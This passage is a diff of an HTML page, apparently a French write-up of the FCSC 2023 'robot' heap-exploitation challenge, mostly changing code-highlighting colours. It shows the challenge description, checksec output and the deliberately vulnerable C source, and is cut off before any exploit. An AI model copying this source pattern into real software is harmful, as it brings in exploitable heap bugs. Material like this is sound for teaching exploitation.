@@ -28,6 +28,10 @@
 
 
 
+    
+        <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    
+
 
     <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -166,7 +170,7 @@
         <h2 id="note">Note</h2>
 <p><em>robot</em> était un challenge de pwn issu du <strong>FCSC 2023</strong>. Globalement un très bon challenge, et surtout une très bonne initiation à l&rsquo;exploitation <em>heap</em> puisque je n&rsquo;en avais jamais fait !</p>
 <h2 id="description">Description</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>La startup _FunWithRobots &amp; Co._ souhaite proposer un service interactif, qui tourne sur un serveur distant et qui simule un robot avec beaucoup de réalisme. 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>La startup _FunWithRobots &amp; Co._ souhaite proposer un service interactif, qui tourne sur un serveur distant et qui simule un robot avec beaucoup de réalisme. 
 </span></span><span style="display:flex;"><span>Mais la veille de l&#39;inauguration, le chef de projet se souvient d&#39;une vague mention concernant des exigences de sécurité...
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Comme vous êtes la personne chargée de la sécurité, il a besoin de votre validation.
@@ -176,11 +180,11 @@
 </span></span></code></pre></div><p><a href="https://france-cybersecurity-challenge.fr/files/069ca7f147eb771e02814586cfa94514/robot"><code>robot</code></a>, <a href="https://france-cybersecurity-challenge.fr/files/323d5aa30fc1f647e4d60019a74b3dde/robot.c"><code>robot.c</code></a></p>
 <h2 id="analyse-du-fichier">Analyse du fichier</h2>
 <p>On peut commencer par regarder rapidement à quoi on s&rsquo;attaque grâce aux commandes <em>file</em> et <em>checksec</em>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>file robot <span style="color:#f92672">&amp;&amp;</span> checksec robot
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>file robot <span style="color:#ff79c6">&amp;&amp;</span> checksec robot
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>robot: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB pie executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (SYSV), dynamically linked, interpreter <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>, BuildID[sha1]<span style="color:#f92672">=</span>b1bb8d94563bab30f6fe505e4a7220d51f68c5aa, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">3.2.0</span>, <span style="color:#f92672">not</span> stripped
+</span></span><span style="display:flex;"><span>robot: ELF <span style="color:#bd93f9">64</span><span style="color:#ff79c6">-</span>bit LSB pie executable, x86<span style="color:#ff79c6">-</span><span style="color:#bd93f9">64</span>, version <span style="color:#bd93f9">1</span> (SYSV), dynamically linked, interpreter <span style="color:#ff79c6">/</span>lib64<span style="color:#ff79c6">/</span>ld<span style="color:#ff79c6">-</span>linux<span style="color:#ff79c6">-</span>x86<span style="color:#ff79c6">-</span><span style="color:#bd93f9">64.</span>so<span style="color:#bd93f9">.2</span>, BuildID[sha1]<span style="color:#ff79c6">=</span>b1bb8d94563bab30f6fe505e4a7220d51f68c5aa, <span style="color:#ff79c6">for</span> GNU<span style="color:#ff79c6">/</span>Linux <span style="color:#bd93f9">3.2.0</span>, <span style="color:#ff79c6">not</span> stripped
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
+</span></span><span style="display:flex;"><span>    Arch:     amd64<span style="color:#ff79c6">-</span><span style="color:#bd93f9">64</span><span style="color:#ff79c6">-</span>little
 </span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
 </span></span><span style="display:flex;"><span>    Stack:    Canary found
 </span></span><span style="display:flex;"><span>    NX:       NX enabled
@@ -195,192 +199,192 @@
 <li>Les options <strong>3</strong> et <strong>6</strong> vont respectivement nous permettre de supprimer un chunk (via <em>free</em>) et d&rsquo;appeller la fonction <code>admin</code></li>
 </ul>
 <p>Maintenant qu&rsquo;on sait ça, on va regarder un peu le code source pour tenter de trouver une vuln et de vérifier nos hypothèses:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;openssl/sha.h&#34;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ctype.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#define TIMEOUT       120 </span><span style="color:#75715e">// in seconds
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> encrypted[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;8f75456b574439e191ae14f3e95a80a881a7216c2ac69b9c342aa62f8a048e0e&#34;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&#34;openssl/sha.h&#34;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;ctype.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;signal.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define TIMEOUT       120 </span><span style="color:#6272a4">// in seconds
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">char</span> encrypted[] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;8f75456b574439e191ae14f3e95a80a881a7216c2ac69b9c342aa62f8a048e0e&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Robot {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">16</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>makeNoise)();
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>move)();
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> Robot {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> name[<span style="color:#bd93f9">16</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>makeNoise)();
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>move)();
 </span></span><span style="display:flex;"><span>};
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> RobotUserGuide {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> guide[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> RobotUserGuide {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> guide[<span style="color:#bd93f9">32</span>];
 </span></span><span style="display:flex;"><span>};
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">timeout</span>(<span style="color:#66d9ef">int</span> sig)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">timeout</span>(<span style="color:#8be9fd">int</span> sig)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">exit</span>(EXIT_FAILURE);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">bleep</span>(<span style="color:#66d9ef">struct</span> Robot <span style="color:#f92672">*</span>d)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">bleep</span>(<span style="color:#ff79c6">struct</span> Robot <span style="color:#ff79c6">*</span>d)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">3</span>; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Bip !&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">usleep</span> (<span style="color:#ae81ff">500000</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>; i<span style="color:#ff79c6">&lt;</span><span style="color:#bd93f9">3</span>; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">puts</span> (<span style="color:#f1fa8c">&#34;Bip !&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">usleep</span> (<span style="color:#bd93f9">500000</span>);
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;La discussion avec %s est un peu ennuyeuse...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, d<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;La discussion avec %s est un peu ennuyeuse...</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, d<span style="color:#ff79c6">-&gt;</span>name);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">roll</span>(<span style="color:#66d9ef">struct</span> Robot <span style="color:#f92672">*</span>d)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">roll</span>(<span style="color:#ff79c6">struct</span> Robot <span style="color:#ff79c6">*</span>d)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;%s se déplace en grinçant !</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, d<span style="color:#f92672">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;%s se déplace en grinçant !</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, d<span style="color:#ff79c6">-&gt;</span>name);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">newRobot</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span><span style="color:#ff79c6">*</span> <span style="color:#50fa7b">newRobot</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>s)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Vous construisez un nouveau robot. %s est un très joli nom pour un robot !</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> Robot <span style="color:#f92672">*</span>newrobot <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span> (<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Robot));
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strncpy</span> (newrobot<span style="color:#f92672">-&gt;</span>name, s, <span style="color:#ae81ff">15</span>);
-</span></span><span style="display:flex;"><span>    newrobot<span style="color:#f92672">-&gt;</span>makeNoise <span style="color:#f92672">=</span> bleep;
-</span></span><span style="display:flex;"><span>    newrobot<span style="color:#f92672">-&gt;</span>move <span style="color:#f92672">=</span> roll;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>) newrobot;
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;Vous construisez un nouveau robot. %s est un très joli nom pour un robot !</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, s);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">struct</span> Robot <span style="color:#ff79c6">*</span>newrobot <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">malloc</span> (<span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> Robot));
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">strncpy</span> (newrobot<span style="color:#ff79c6">-&gt;</span>name, s, <span style="color:#bd93f9">15</span>);
+</span></span><span style="display:flex;"><span>    newrobot<span style="color:#ff79c6">-&gt;</span>makeNoise <span style="color:#ff79c6">=</span> bleep;
+</span></span><span style="display:flex;"><span>    newrobot<span style="color:#ff79c6">-&gt;</span>move <span style="color:#ff79c6">=</span> roll;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> (<span style="color:#8be9fd">void</span><span style="color:#ff79c6">*</span>) newrobot;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">admin</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pwd)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">admin</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>pwd)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> hash[SHA256_DIGEST_LENGTH];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>    result[<span style="color:#ae81ff">65</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> hash[SHA256_DIGEST_LENGTH];
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span>    result[<span style="color:#bd93f9">65</span>];
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SHA256</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) pwd, <span style="color:#a6e22e">strlen</span>(pwd), hash);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">SHA256</span>((<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>) pwd, <span style="color:#50fa7b">strlen</span>(pwd), hash);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SHA256_DIGEST_LENGTH; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sprintf</span>(result <span style="color:#f92672">+</span> (i <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>), <span style="color:#e6db74">&#34;%02x&#34;</span>, hash[i]);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> SHA256_DIGEST_LENGTH; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">sprintf</span>(result <span style="color:#ff79c6">+</span> (i <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">2</span>), <span style="color:#f1fa8c">&#34;%02x&#34;</span>, hash[i]);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(result, encrypted) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/bin/cat&#34;</span>, <span style="color:#e6db74">&#34;/bin/cat&#34;</span>, <span style="color:#e6db74">&#34;flag.txt&#34;</span>, NULL);
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;execl&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">2</span>);
-</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;ERROR: wrong password!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#50fa7b">strcmp</span>(result, encrypted) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">execl</span>(<span style="color:#f1fa8c">&#34;/bin/cat&#34;</span>, <span style="color:#f1fa8c">&#34;/bin/cat&#34;</span>, <span style="color:#f1fa8c">&#34;flag.txt&#34;</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">perror</span>(<span style="color:#f1fa8c">&#34;execl&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">exit</span>(<span style="color:#bd93f9">2</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;ERROR: wrong password!&#34;</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>()
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> Robot  <span style="color:#f92672">*</span>robot <span style="color:#f92672">=</span> NULL;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> RobotUserGuide <span style="color:#f92672">*</span>userGuide <span style="color:#f92672">=</span> NULL;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> ordre <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">64</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">struct</span> Robot  <span style="color:#ff79c6">*</span>robot <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">struct</span> RobotUserGuide <span style="color:#ff79c6">*</span>userGuide <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> ordre <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> input[<span style="color:#bd93f9">64</span>] <span style="color:#ff79c6">=</span> {<span style="color:#bd93f9">0</span>};
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Install challenge timeout
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">signal</span>(SIGALRM, timeout);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alarm</span>(TIMEOUT);
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// Install challenge timeout
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#50fa7b">signal</span>(SIGALRM, timeout);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">alarm</span>(TIMEOUT);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Menu */</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Que faites-vous ?&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;1: Construire un robot</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">4: Rédiger le mode d&#39;emploi&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;2: Le faire parler</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">5: Afficher le mode d&#39;emploi&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;3: Jouer avec le robot</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">6: Admin&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;0: Quitter&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> (<span style="color:#bd93f9">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">/* Menu */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">puts</span> (<span style="color:#f1fa8c">&#34;Que faites-vous ?&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">puts</span> (<span style="color:#f1fa8c">&#34;1: Construire un robot</span><span style="color:#f1fa8c">\t\t</span><span style="color:#f1fa8c">4: Rédiger le mode d&#39;emploi&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">puts</span> (<span style="color:#f1fa8c">&#34;2: Le faire parler</span><span style="color:#f1fa8c">\t\t</span><span style="color:#f1fa8c">5: Afficher le mode d&#39;emploi&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">puts</span> (<span style="color:#f1fa8c">&#34;3: Jouer avec le robot</span><span style="color:#f1fa8c">\t\t</span><span style="color:#f1fa8c">6: Admin&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">puts</span> (<span style="color:#f1fa8c">&#34;0: Quitter&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;&gt; &#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Ordre */</span>
-</span></span><span style="display:flex;"><span>        ordre <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>) <span style="color:#a6e22e">getc</span> (stdin);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ordre <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">getc</span> (stdin); <span style="color:#75715e">/* Enlève \n */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">/* Ordre */</span>
+</span></span><span style="display:flex;"><span>        ordre <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span>) <span style="color:#50fa7b">getc</span> (stdin);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (ordre <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;\n&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">continue</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">getc</span> (stdin); <span style="color:#6272a4">/* Enlève \n */</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Exécution de l&#39;ordre */</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (ordre) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Comment vous l&#39;appelez ?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fgets</span> (input, <span style="color:#ae81ff">64</span>, stdin);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (input[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
-</span></span><span style="display:flex;"><span>                        input[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">/* Exécution de l&#39;ordre */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">switch</span> (ordre) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;1&#39;</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;Comment vous l&#39;appelez ?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#50fa7b">fgets</span> (input, <span style="color:#bd93f9">64</span>, stdin);
